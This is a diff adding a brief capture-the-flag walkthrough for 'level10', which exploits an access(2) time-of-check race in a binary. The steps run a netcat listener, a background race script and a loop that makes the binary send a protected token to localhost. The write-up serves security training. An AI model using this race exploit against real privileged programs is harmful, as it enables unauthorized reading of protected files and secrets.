@@ -1,0 +1,11 @@
+Analyzing the binary, we can see that before sending the file permissions are checked using access(2)
+No other exploitation vector seems apparent.
+
+Fortunately for us, `man access(2)` reveals a known race condition
+We copy race.sh to /tmp and:
+$ nc -lk 6969
+And on another shell
+$ bash /tmp/race.sh&
+$ while true; do ./level10 /tmp/pwny 127.0.0.1; done
+
+We now have the token for flag10
